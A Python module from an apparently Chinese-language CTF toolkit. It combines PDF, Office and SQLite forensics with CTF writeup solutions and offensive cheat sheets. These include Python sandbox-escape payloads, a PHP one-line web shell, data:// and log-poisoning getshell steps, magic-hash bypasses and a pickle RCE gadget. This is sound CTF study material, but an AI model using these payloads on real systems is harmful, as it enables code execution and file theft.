"""PDF / Office 文档取证：元数据、内嵌对象、隐藏内容、尾部数据。"""

from __future__ import annotations

import io
import re
import zipfile
from dataclasses import dataclass, field

from .flags import find_flags


@dataclass
class DocFinding:
    kind: str
    title: str
    detail: str = ""
    data: bytes = b""


def _flags(text: str) -> list[str]:
    return [h.value for h in find_flags(text) if h.score >= 40]


def pdf_analyze(data: bytes) -> list[DocFinding]:
    out: list[DocFinding] = []
    out.append(DocFinding("info", "文件大小", f"{len(data)} 字节"))
    # 结构关键字
    keys = {
        b"/JavaScript": "内嵌 JavaScript（可能有恶意脚本或线索）",
        b"/JS": "内嵌 JS 引用",
        b"/OpenAction": "打开即执行的动作",
        b"/AA": "附加动作（自动执行）",
        b"/EmbeddedFile": "内嵌文件（可用雕复提取）",
        b"/Launch": "启动外部程序",
        b"/URI": "外链 URI",
        b"/Encrypt": "已加密",
    }
    for k, desc in keys.items():
        if k in data:
            out.append(DocFinding("warn" if k in (b"/JavaScript", b"/Launch", b"/Encrypt") else "info",
                                  desc, k.decode(), b""))
    # 尾部数据
    idx = data.rfind(b"%%EOF")
    if idx > 0 and idx + 5 < len(data):
        tail = data[idx + 5:]
        out.append(DocFinding("data", "%%EOF 之后有附加数据", f"{len(tail)} 字节", tail))
    # 元数据 + 文本
    try:
        from pypdf import PdfReader
        reader = PdfReader(io.BytesIO(data))
        meta = reader.metadata or {}
        if meta:
            items = [f"{k}: {str(v)[:200]}" for k, v in meta.items()]
            out.append(DocFinding("data", "PDF 元数据", "\n".join(items)))
            for it in items:
                if _flags(it):
                    out.append(DocFinding("data", "元数据里的 flag 线索", it))
        texts = []
        for page in reader.pages[:30]:
            try:
                texts.append(page.extract_text() or "")
            except Exception:
                continue
        full = "\n".join(texts)
        if full.strip():
            out.append(DocFinding("data", "PDF 文本内容", full[:2000]))
        # 附件
        try:
            names = list((reader.attachments or {}).keys())
        except Exception:
            names = []
        for name in names:
            for item in reader.attachments[name]:
                out.append(DocFinding("data", f"PDF 附件 {name}", f"{len(item)} 字节", item))
    except Exception as exc:  # noqa: BLE001
        out.append(DocFinding("warn", "PDF 结构解析失败", str(exc)))
    # 未压缩流里的明文
    hits = _flags(data.decode("latin-1", "ignore"))
    if hits:
        out.append(DocFinding("data", "PDF 原始字节里出现 flag", ", ".join(hits[:5])))
    return out


OFFICE_SIG = (b"PK\x03\x04",)


def office_analyze(data: bytes) -> list[DocFinding]:
    out: list[DocFinding] = []
    if not any(data.startswith(s) for s in OFFICE_SIG):
        return out
    try:
        zf = zipfile.ZipFile(io.BytesIO(data))
    except zipfile.BadZipFile:
        return out
    names = zf.namelist()
    out.append(DocFinding("info", "文档结构", f"{len(names)} 个内部文件（docx/xlsx/pptx 本质是 zip）"))
    interesting = [n for n in names if any(k in n.lower() for k in (
        "docprops", "core.xml", "app.xml", "comment", "media", "embedding", "vba", "custom",
        "hidden", "notes", "footer", "header"))]
    if interesting:
        out.append(DocFinding("info", "值得关注的内部文件", "\n".join(interesting[:30])))
    for n in names:
        lower = n.lower()
        if lower.endswith((".xml", ".rels", ".txt")) or "comment" in lower:
            try:
                text = zf.read(n).decode("utf-8", "ignore")
            except Exception:
                continue
            hits = _flags(text)
            if hits:
                out.append(DocFinding("data", f"{n} 里出现 flag", ", ".join(hits[:3])))
            if "hidden" in text.lower() and "[content_types]" not in lower:
                out.append(DocFinding("warn", f"{n} 含 hidden 标记",
                                      re.sub(r"<[^>]+>", " ", text)[:300]))
        elif lower.endswith((".bin", ".emf", ".wmf", ".vba")):
            blob = zf.read(n)
            hits = _flags(blob.decode("latin-1", "ignore"))
            if hits:
                out.append(DocFinding("data", f"内嵌对象 {n} 里出现 flag", ", ".join(hits[:3]), blob))
            else:
                out.append(DocFinding("info", f"内嵌对象 {n}", f"{len(blob)} 字节（可能藏着东西）", blob))
    # 隐藏工作表（xlsx）
    for n in names:
        if n.endswith(".xml") and "workbook" in n:
            text = zf.read(n).decode("utf-8", "ignore")
            for m in re.finditer(r'<sheet [^>]*state="(hidden|veryHidden)"[^>]*name="([^"]+)"', text):
                out.append(DocFinding("warn", "隐藏工作表", f"{m.group(2)}（{m.group(1)}）"))
    # 文档整体字节扫描
    hits = _flags(data.decode("latin-1", "ignore"))
    if hits:
        out.append(DocFinding("data", "文档原始字节里出现 flag", ", ".join(hits[:5])))
    return out


PYJAIL_BYPASS = {
    "没有引号": "用 chr() / bytes.fromhex() / 变量拼接，例如 print(chr(102)+chr(108)+chr(97)+chr(103))",
    "没有括号": "用装饰器或 __getitem__ 取字符；也可能要打 payload 成字符串再 eval",
    "没有等号": "用 exec('a=1')、setattr、dict 更新，或 := 海象运算符",
    "没有下划线": "__import__ → getattr(__builtins__, chr(95)*2+'import'+chr(95)*2)；"
                  "或用 dir()/vars()/中括号取值绕过",
    "没有字母数字": "用 chr()+eval 或 %(字) 格式化；也可用 ()[]{} 的 Unicode 同形字",
    "禁用 os/system": "换 subprocess / pty.spawn / os.popen / os.execv / os.environ 读环境变量",
    "禁用 open": "用 os.open+read、io.open、pathlib.Path.read_text、codecs.open",
    "禁用 builtins": "从子类回溯：().__class__.__base__.__subclasses__() 找 warnings.catch_warnings "
                     "→ __init__.__globals__['__builtins__']",
    "长度限制": "分段执行 / 用 input() 二次注入 / 用 exec(input()) 拆成多次",
    "过滤 eval/exec": "用 getattr(__builtins__,'ev'+'al')、compile+exec、或者 decorator 调用",
}


def pyjail_assist(source: str) -> list[str]:
    """根据 pyjail 源码里的黑名单，给出对应的绕过思路。"""
    lines = [f"源码长度：{len(source)} 字符"]
    lower = source
    hints = []
    if re.search(r"[a-z]+\s*not in\s*|\bin\s+blacklist|\bbanned\b|\bforbid", lower, re.I):
        hints.append("源码里有黑名单过滤逻辑")
    for key, tip in PYJAIL_BYPASS.items():
        cond = False
        if key == "没有引号" and re.search(r"['\"]\s*not in|in\s*['\"]['\"]", lower):
            cond = True
        elif key == "没有括号" and "(" in source and "not in" in lower:
            cond = True
        elif key == "没有等号" and "=" in source and "not in" in lower:
            cond = True
        elif key == "没有下划线" and re.search(r"_+\s*not in|'_'", lower):
            cond = True
        elif key == "没有字母数字" and re.search(r"isalnum|isalpha|isdigit", lower):
            cond = True
        elif key == "禁用 os/system" and re.search(r"os|system", lower) and "not in" in lower:
            cond = True
        elif key == "禁用 open" and re.search(r"open", lower) and "not in" in lower:
            cond = True
        elif key == "禁用 builtins" and re.search(r"builtins|__import__", lower) and "not in" in lower:
            cond = True
        elif key == "长度限制" and re.search(r"len\s*\(", lower):
            cond = True
        elif key == "过滤 eval/exec" and re.search(r"eval|exec", lower):
            cond = True
        if cond:
            hints.append(f"【{key}】{tip}")
    if not hints:
        hints = ["没有识别到明显的黑名单特征；可以贴出源码关键片段，"
                 "或直接试经典 payload：().__class__.__base__.__subclasses__()"]
    lines += ["", "可能的绕过思路："] + ["  " + h for h in hints]
    lines += ["", "通用起手式：",
              "  print(open('/flag').read())",
              "  print(open('flag.txt').read())",
              "  import os; os.system('cat /flag')",
              "  ().__class__.__base__.__subclasses__()  # 找 os._wrap_close 拿 __globals__"]
    return lines


MAGIC_HASHES = [
    ("240610708", "MD5 = 0e462097431906509019562988736854", "与另一个 0e 开头哈希比较时为真"),
    ("QNKCDZO", "MD5 = 0e830400451993494058024219903391", "经典弱类型绕过"),
    ("aabg7XSs", "MD5 = 0e087386482136013740957780965295", "同上"),
    ("aabC9RqS", "MD5 = 0e041022518165728065344349536299", "同上"),
    ("s878926199a", "MD5 = 0e545993274517709034328855841020", "同上"),
    ("0e215962017", "MD5 = 0e291242476940776845150308577824", "自身 md5 也是 0e 开头"),
    (" admin", "双写/空格绕过 stripos/md5 比较", "PHP 特性"),
    ("%00", "空字节截断（PHP < 5.3.4）", "文件路径/包含"),
]

# --------------------------------------------------------------------------- #
# WZBC & CTF 2025 官方 WriteUp 解法手册（把校赛每类题的解法固化进工具）
# --------------------------------------------------------------------------- #
WZBC_2025 = {
    "Web-babyWeb（Easy-300）": """题目：2048 小游戏，“想拿到 flag 就先通关 2048”。
解法：不用真通关——**答案在前端 JS 里**。
  1. 打开网页，右键查看源代码 / F12 → Sources，找到 /js/ 下的脚本（如 html_actuator.js）
  2. 搜 flag / win / game-won / message 关键字
  3. 源码里就是 `var message = won ? "wzbc{...}" : "Game over!"`
工具：Web →「前端 JS 抓取审计」一键抓取页面所有 JS 并搜 flag；也可以把 JS 文件下载后丢进「源码审计」。
考点：前端源码泄露（flag 硬编码在 JS 里）——永远先看前端源码，别急着玩游戏。""",

    "Web-ezPy（Hard-1000）": """题目：Flask 题目，Python 沙箱，黑名单过滤符号/关键字。
解法：Python 沙箱逃逸（pyjail），核心是**绕过黑名单拿到 os 并执行命令**。
  1. 先看源码里的黑名单：`blacklist_pattern = r"[!\\"#$%&'()*+,-./:;?@[\\\\\\]^_`{|}~]"` 之类
  2. 常用绕过思路：
     · 禁下划线 → `getattr(__builtins__, chr(95)*2+'import'+chr(95)*2)`，或从子类回溯
     · 禁引号 → 用 chr()/bytes.fromhex() 拼字符串
     · 禁括号 → 用装饰器 / __getitem__ / f-string 取值
     · 禁 import → `().__class__.__base__.__subclasses__()` 找 os._wrap_close 拿 __globals__
  3. 经典起手：
     ().__class__.__base__.__subclasses__()
     [x for x in ().__class__.__base__.__subclasses__() if 'catch_warnings' in x.__name__]
  4. 拿到 os 后：os.popen('cat /flag').read()
工具：Misc →「pyjail 沙箱绕过助手」会按你贴的源码给出对应绕过思路 + payload。
考点：黑名单绕过、模块导入绕过（模块导入相关关键词在校赛 WriteUp 里出现 32 次，是最热考点）。""",

    "Web-babyGo（Normal-500）": """题目：Go 写的 web，页面空白；附件给了 Dockerfile + main.go。
解法：**Go 模板注入（SSTI）+ JWT 伪造**。
  1. 读 main.go：/flag 接口用 text/template 渲染用户可控的 id → `{{ . }}` 会被当模板执行
  2. JWT 用 HS256，密钥来自环境变量 KEY；先想办法拿到/猜出密钥，或伪造 is_admin=true
  3. 带上 JWT 请求 /flag，id 里塞模板 payload，服务端渲染时把 flag 带出来
     （WriteUp 里的响应：{"status":true,"msg":"Hi {{ . }}, flag is wbzc{...}"}）
工具：Web →「JWT 伪造（none/重签）」伪造 token；「SSTI 模板注入」里已加入 Go 模板探针 `{{ . }}`、`{{ len "abcd" }}`。
考点：Go text/template 注入、JWT 弱密钥/伪造、读附件里的源码找漏洞。""",

    "Misc-CompressionLab（Normal-500）": """题目：一个加密 zip，套了很多层。
解法：**嵌套 zip + 真假加密交替 + 密码就是文件名**。
  1. 拖进 010 Editor 看标志位：`0100` 改成 `0000` 就是**伪加密**修复
  2. 解出来还是 zip，这次是真加密 → 用**压缩包自己的文件名（去扩展名）当密码**
  3. 重复以上步骤（奇数层伪加密、偶数层真加密、密码=内层文件名）
  4. 全部解开后拿到二进制串 → 二进制转 ASCII（每 8 位一个字符）
  5. 最后拿到 JWT，再去请求 /flag（属于 Web 部分）
工具：Misc →「压缩包解包」「ZIP 伪加密修复」「ZIP 口令 = 文件名」「进制/数字编码」；
     全自动分析已经会：伪加密自动修 → 加密的先试文件名再试字典 → 递归解到底。
考点：ZIP 伪加密、嵌套解包、文件名当密码、二进制转字符。""",

    "Misc-DeepSleep（Normal-500）": """题目：给了个 .ad1 文件（FTK Imager 逻辑镜像），要密码。
解法：**文件名提示 + 键盘 Shift 变密码 + 镜像里的时间戳隐写**。
  1. 文件名里的 `c2hpZnQh` 是 base64 → 解出 `shift!`（提示）
  2. 文件头/尾还有提示 `the key is 12345678, but it was transformed!`
  3. 按提示做键盘 Shift：`12345678` → `!@#$%^&*`，用它解开 ad1
  4. 镜像里几百个同大小 `.crypto` 文件（Encrypto 加密），**修改时间只有两种**：
     2025 年→0、2024 年→1，按文件名序号排好拼成二进制 → 得到 key
     `0a7e3b19dc703f2641c7ec4f0743364e`
  5. 用 key 解 Encrypto 文件得到 flag
工具：Misc →「文件名提示 / 键盘错位」解文件名与 Shift；「文件时间戳隐写」对着文件夹一键还原二进制；
     大文件用「内存镜像快速分析」做 strings/雕复。
考点：文件名藏线索、键盘错位当密码、文件系统元数据（时间戳）编码。""",

    "Misc-Who's Cat（Normal）": """题目：一张长方形图，提示“猫脸/Alpha/Wednesday”。
解法：**猫脸变换（Arnold cat map）逆变换**，但长方形要先处理。
  1. Arnold 变换定义在 n×n 正方形上 → 先把长方形图**拉伸成正方形**（WriteUp 用 334×334）
  2. 再枚举逆变换次数（1~60），看图何时恢复成正常画面
工具：Misc →「猫脸变换还原」已自动做「长方形→正方形→枚举 1~60 次逆变换→生成对照图→自动查 flag/二维码」。
考点：Arnold 猫脸变换、图像几何变换还原。""",

    "Crypto-Curve（Hard-1000）": """题目：在 **RSA 模数 n=p*q**（p,q ≡ 3 mod 4）上定义椭圆曲线 y²=x³+ax+b，
加密方式是每次 G=G+G，然后 c += [G.x ^ 明文块, G.y ^ 明文块]。
解法：**用“分母不可逆”分解 n，再用 CRT 复现倍点**。
  1. 在模合数 n 上做点加/倍点，会遇到分母与 n 不互素 → gcd(分母, n) = p 直接分解
  2. 知道 p、q 后，分别模 p、模 q 计算每轮倍点坐标，再用 CRT 合并出 mod n 的坐标
  3. 用坐标异或密文块，还原明文（去掉 PKCS7 填充）
工具：Crypto →「椭圆曲线（复合模数）求解」：填 n/a/b/G(x,y)/密文数组，自动分解 + 还原明文。
考点：ECC over composite modulus、用 gcd 分解、CRT。""",

    "Crypto-We are Family!（Easy-300）": """题目：“All the codes are family”。
解法：**Base 家族连环解码**（一层套一层）。
  1. 题目脚本先做了一次“圆锥曲线/点倍”式的 XOR 还原（拿到一串 Base 编码）
  2. WriteUp 里试出来的解码链是：
     base36 → base100 → base16 → base85(a85) → base64 → base91 → base58 → base62 → base32
工具：Crypto →「Base 家族连环解码」：自动把所有 Base（64/32/16/85/a85/58/91/36/62/100）
     反复试到出现 flag 为止，并给出实际用到的解码链。
考点：Base 家族（base36/62/100 等冷门变体）、多层编码。""",

    "Reverse-reMe（Easy-300）": """题目：逆向题，Easy-300。
解法（通用套路）：
  1. 先识别文件类型与保护（PE/ELF、位数、PIE/NX/Canary）——「二进制信息卡」
  2. strings 找提示与假 flag；再看加壳线索（UPX 等）
  3. 输入校验类题目：定位比较逻辑，把期望值抄出来/写脚本爆出输入
  4. Python 题直接 .pyc 反汇编；打包的用 PyInstaller 解包
工具：Reverse →「二进制信息卡」「加壳/反调试线索」「strings 提取」「Python .pyc 反汇编」「PyInstaller 解包」「加密算法特征识别」。
考点：基础逆向（识别 + 字符串 + 比较逻辑还原）。""",
}


PYJAIL_PAYLOADS = """【Python 沙箱逃逸（pyjail）常用 payload】
# 1) 看当前环境与黑名单
print(globals().keys()); print(dir())

# 2) 从子类回溯拿 os（最常用）
().__class__.__base__.__subclasses__()
[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('cat /flag')

# 3) 禁下划线：用 getattr + chr(95)
getattr(getattr(getattr(().__class__, chr(95)*2+'base'+chr(95)*2), chr(95)*2+'subclasses'+chr(95)*2)())

# 4) 禁引号：用 chr 拼字符串
chr(47)+chr(102)+chr(108)+chr(97)+chr(103)     # "/flag"

# 5) 禁括号：用装饰器 / __getitem__ / f-string 取值
().__class__.__mro__[1].__subclasses__()        # 用中括号代替部分调用

# 6) 直接用 builtins
import builtins; builtins.__import__('os').popen('cat /flag').read()
__builtins__.__dict__['__import__']('os').system('sh')

# 7) 快捷：eval/exec 被过滤时
getattr(__builtins__, 'ev'+'al')("__import__('os').system('cat /flag')")

# 8) 读文件
print(open('/flag').read()) / open('flag.txt').read()
"""


# --------------------------------------------------------------------------- #
# SQLite 数据库取证
# --------------------------------------------------------------------------- #
def sqlite_analyze(data: bytes, limit_rows: int = 200) -> list[DocFinding]:
    """SQLite 数据库里翻 flag：所有表、所有列都扫一遍。"""
    import sqlite3
    import tempfile
    out: list[DocFinding] = []
    if data[:15] != b"SQLite format 3":
        return out
    path = ""
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".db") as fh:
            fh.write(data)
            path = fh.name
        con = sqlite3.connect(f"file:{path}?mode=ro", uri=True)
        con.text_factory = bytes
        cur = con.cursor()
        tables = [r[0].decode("utf-8", "replace") for r in
                  cur.execute("SELECT name FROM sqlite_master WHERE type='table'").fetchall()]
        out.append(DocFinding("info", "SQLite 表", ", ".join(tables) or "（无表）"))
        hits: list[str] = []
        for table in tables[:40]:
            try:
                rows = cur.execute(f'SELECT * FROM "{table}" LIMIT {limit_rows}').fetchall()
            except Exception:
                continue
            cols = [d[0] for d in cur.description] if cur.description else []
            if not rows:
                continue
            preview = []
            for row in rows[:8]:
                cells = []
                for cell in row:
                    if isinstance(cell, bytes):
                        try:
                            cell = cell.decode("utf-8")
                        except UnicodeDecodeError:
                            cell = cell.decode("latin-1")
                    cells.append(str(cell)[:60])
                preview.append(" | ".join(cells))
                for cell in row:
                    if isinstance(cell, bytes):
                        try:
                            cell = cell.decode("utf-8", "replace")
                        except Exception:
                            continue
                    for h in find_flags(str(cell)):
                        if h.score >= 40:
                            hits.append(f"{table}.{cols[0] if cols else '?'}: {h.value}")
            out.append(DocFinding("data", f"表 {table}（{len(rows)} 行）",
                                  f"列：{', '.join(str(c) for c in cols)}\n" + "\n".join(preview)))
        if hits:
            out.append(DocFinding("data", "★ 数据库里找到 flag",
                                  "\n".join(dict.fromkeys(hits))[:1000]))
        con.close()
    except Exception as exc:  # noqa: BLE001
        out.append(DocFinding("warn", "SQLite 解析失败", str(exc)))
    finally:
        try:
            if path:
                import os
                os.unlink(path)
        except OSError:
            pass
    return out


# --------------------------------------------------------------------------- #
# PHP 伪协议 / 反序列化 payload 生成（静态速查）
# --------------------------------------------------------------------------- #
PHP_WRAPPERS = """【php://filter 读源码（最常见）】
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=flag.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php      （iconv 过滤器绕过）
php://filter/read=string.rot13/resource=index.php

【其它伪协议】
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWzFdKTs/Pg==   （配合 include 可直接 RCE）
data://text/plain,<?php system($_GET[1]);?>
php://input                     （POST 里放 PHP 代码，需 allow_url_include=On）
phar://upload.jpg/x.php         （phar 反序列化 / 读取 phar 内文件）
zip://upload.zip%23x.php        （zip 里塞 php 再用 zip:// 包含）
expect://id                     （需 expect 扩展）

【读取系统文件】
/etc/passwd  /proc/self/environ  /proc/self/cmdline  /var/log/nginx/access.log
/flag  /flag.txt  ../../../../flag

【日志/会话包含 getshell】
1) 先让 access.log 里出现 <?php system($_GET[1]);?>（ua 或 url 里带）
2) 再 ?file=/var/log/nginx/access.log&1=id
3) session：?file=/tmp/sess_<PHPSESSID>（先往 session 里写马）"""


PHP_SERIALIZE_HELP = """【PHP 反序列化 payload 构造】
类型标记：s:长度:"字符串";  i:整数;  d:浮点;  b:0/1;  a:数量:{...};  O:类名长度:"类名":属性数:{...}
示例：
  O:4:"User":2:{s:4:"name";s:5:"admin";s:7:"isAdmin";b:1;}
  a:1:{i:0;s:4:"test";}

常见考点：
· __wakeup / __destruct / __toString / __invoke 里的危险操作
· 属性数大于真实数量可绕过 __wakeup（CVE-2016-7124，PHP < 7.0.10）
· 私有属性用 %00类名%00属性名，保护属性用 %00*%00属性名
· public 属性直接写名字
· 若过滤了 O:，可用 C: 自定义 Serializable，或数组绕过

【Python pickle 反序列化】
  import pickle, os
  class E:
      def __reduce__(self):
          return (os.system, ("cat /flag",))
  print(pickle.dumps(E()))

【Java 反序列化】
  工具：ysoserial（CommonsCollections / URLDNS 等链），先探测是否存在反序列化入口（base64 的 rO0AB...）"""
